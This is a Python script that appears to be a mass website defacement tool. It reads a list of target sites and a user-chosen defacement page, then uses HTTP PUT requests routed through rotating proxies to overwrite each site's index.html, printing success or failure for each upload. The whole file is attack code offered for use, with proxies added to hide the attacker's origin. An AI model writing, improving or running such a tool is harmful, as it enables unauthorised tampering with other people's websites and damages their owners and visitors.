# -*- coding: utf-8 -*-
try:
    import os
    import sys
    import time
    import random
    import os.path
    import requests
    import threading
    from requests.exceptions import RequestException
except ImportError:
    exit("Install requests and try again (pip3 install requests)")

# Define your list of proxy addresses here
proxies = None

def get_proxies(file_name):
    try:
        with open(file_name, 'r') as f:
            proxy_list = f.readlines()
        proxy_list = [p.strip() for p in proxy_list]
        return proxy_list
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return None

def set_proxies(proxy_file):
    global proxies
    proxy_list = get_proxies(proxy_file)
    if proxy_list:
        proxies = proxy_list
        return True
    return False

def load_proxies():
    while True:
        use_proxies = input("Do you want to use proxies? (y/n): ").strip().lower()
        if use_proxies == 'y':
            proxy_file = input("Enter the filename containing proxy list: ").strip()
            if set_proxies(proxy_file):
                print("Proxies loaded successfully.")
                break
            else:
                print("Failed to load proxies. Please check the proxy file and try again.")
        elif use_proxies == 'n':
            break
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

load_proxies()

os.system("git pull")
os.system("clear")
red = "\033[31m"
blue = "\033[34m"
bold = "\033[1m"
reset = "\033[0m"
green = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)
banner = f"""
 __    __    ___  ____   ___      ___  _____ 
|  |__|  |  /  _]|    \ |   \    /  _]|     |
|  |  |  | /  [_ |  o  )|    \  /  [_ |   __|
|  |  |  ||    _]|     ||  D  ||    _]|  |_  
|  `  '  ||   [_ |  O  ||     ||   [_ |   _] 
 \      / |     ||     ||     ||     ||  |   
  \_/\_/  |_____||_____||_____||_____||__|   
@Spuqe                                            
""" + reset + blue

# Create a file to store vulnerable websites
vulnerable_sites_file = "VulnSites.txt"

def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i + 1:], end="\r")
            time.sleep(0.1)

def eagle(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)

def white(script, target_file="targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        print(" ")
        print(green + bold + "[✓]\033[0m \033[34mUploading your script to %d website(s)...." % (len(target)),
              end="", flush=True)
        print(" ")
        # start the animation thread
        t = threading.Thread(target=animate)
        t.daemon = True  # allow the thread to be killed when the main program ends
        t.start()
        
        for proxy in proxies:
            try:
                site = random.choice(target).strip()
                if not site.startswith("http://"):
                    site = "http://" + site
                # Use a proxy from the list
                s = requests.Session()
                s.proxies = {'http': proxy, 'https': proxy}
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(
                        green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
            except RequestException as e:
                print(yellow + f"Proxy {proxy} died: {e}" + reset)
                continue
            except KeyboardInterrupt:
                print
                exit()

def main(__bn__):
    print(__bn__)
    while True:
        try:
            print(
                green + '[Cant find file!]' + reset + blue)
            print(' ')
            a = eagle(green + "[+]\033[0m \033[34mEnter your deface script's name \033[33m[eg: defacescript.html]\033[0m \033[34m> ")
            if not os.path.isfile(a):
                print(' ')
                print(red + bold + "	file '%s' not found in this folder !" % (a))
                print(" ")
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()
    white(a)

if __name__ == "__main__":
    main(banner)
